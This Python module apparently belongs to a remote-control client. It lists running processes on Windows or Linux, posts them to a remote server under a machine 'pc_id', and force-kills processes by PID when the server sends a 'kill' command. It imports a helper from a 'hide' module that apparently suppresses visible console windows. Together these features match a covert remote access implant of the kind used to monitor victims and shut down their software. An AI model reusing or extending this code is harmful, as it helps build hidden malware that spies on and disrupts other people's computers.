from features.curlmanager import CurlManager
import subprocess
import platform
from features.hide import _get_subprocess_kwargs

def get_running_processes():
    try:
        if platform.system().lower() == 'windows':
            return _get_processes_windows()
        else:
            return _get_processes_linux()
    except Exception as e:
        return []

def _get_processes_windows():
    """Get running processes on Windows"""
    try:
        kwargs = _get_subprocess_kwargs()
        result = subprocess.run(
            ["tasklist", "/fo", "csv", "/v"],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            **kwargs
        )
        
        if result.returncode == 0:
            lines = result.stdout.strip().split('\n')
            if len(lines) > 1:
                processes = []
                for line in lines[1:]:
                    parts = []
                    in_quotes = False
                    current_part = ""
                    i = 0
                    while i < len(line):
                        char = line[i]
                        if char == '"':
                            in_quotes = not in_quotes
                        elif char == ',' and not in_quotes:
                            parts.append(current_part.strip('"'))
                            current_part = ""
                        else:
                            current_part += char
                        i += 1
                    parts.append(current_part.strip('"'))
                    
                    if len(parts) >= 8:
                        process = {
                            "image_name": parts[0],
                            "pid": parts[1],
                            "session_name": parts[2],
                            "session_num": parts[3],
                            "mem_usage": parts[4] if len(parts) > 4 else "N/A"
                        }
                        processes.append(process)
                return processes
            else:
                return []
        else:
            raise Exception(f"Tasklist command failed: {result.stderr}")
    except Exception as e:
        return []

def _get_processes_linux():
    """Get running processes on Linux"""
    try:
        result = subprocess.run(
            ["ps", "aux"],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore'
        )
        
        if result.returncode == 0:
            lines = result.stdout.strip().split('\n')
            if len(lines) > 1:
                processes = []
                for line in lines[1:]:
                    parts = line.split(None, 10)
                    if len(parts) >= 11:
                        # Calculate memory in MB (convert from percentage)
                        mem_pct = parts[3]
                        process = {
                            "image_name": parts[10],  # COMMAND
                            "pid": parts[1],           # PID
                            "session_name": parts[0],  # USER
                            "session_num": "0",
                            "mem_usage": f"{mem_pct}%"
                        }
                        processes.append(process)
                return processes
            else:
                return []
        else:
            raise Exception(f"ps command failed: {result.stderr}")
    except Exception as e:
        return []

def kill_processes(pids):
    """Kill processes (cross-platform)"""
    try:
        pid_list = [str(p).strip() for p in pids if str(p).strip().isdigit()]
        if not pid_list:
            return
        
        if platform.system().lower() == 'windows':
            kwargs = _get_subprocess_kwargs()
            args = ["taskkill", "/F", "/T"]
            for pid in pid_list:
                args.extend(["/PID", pid])
            subprocess.run(args, capture_output=True, text=True, **kwargs)
        else:
            # Linux: use kill -9
            for pid in pid_list:
                subprocess.run(["kill", "-9", pid], capture_output=True, text=True)
    except Exception as e:
        pass

def send_task_manager_data(cfc_instance, message):
    """Send task manager data to the server"""
    try:
        command = message.get("command", "get")
        if command == "get":
            processes = get_running_processes()
            
            curl = CurlManager()
            curl.set_headers(cfc_instance.headers)
            
            task_data = {"data": processes}
            url = f"{cfc_instance.base_url}/task_manager?pc_id={cfc_instance.client_data['pc_id']}"
            curl.post(url=url, json=task_data)        
        elif command == "kill":
            pids = message.get("pids")
            if not pids:
                return
            if isinstance(pids, str):
                pids = [pids]
            kill_processes(pids)

            processes = get_running_processes()
            
            curl = CurlManager()
            curl.set_headers(cfc_instance.headers)
            
            task_data = {"data": processes}
            url = f"{cfc_instance.base_url}/task_manager?pc_id={cfc_instance.client_data['pc_id']}"
            curl.post(url=url, json=task_data)        
    except Exception as e:
        try:
            curl = CurlManager()
            curl.set_headers(cfc_instance.headers)
            error_data = {"data": f"Error: {str(e)}"}
            url = f"{cfc_instance.base_url}/task_manager?pc_id={cfc_instance.client_data['pc_id']}"
            curl.post(url=url, json=error_data)
        except:
            pass
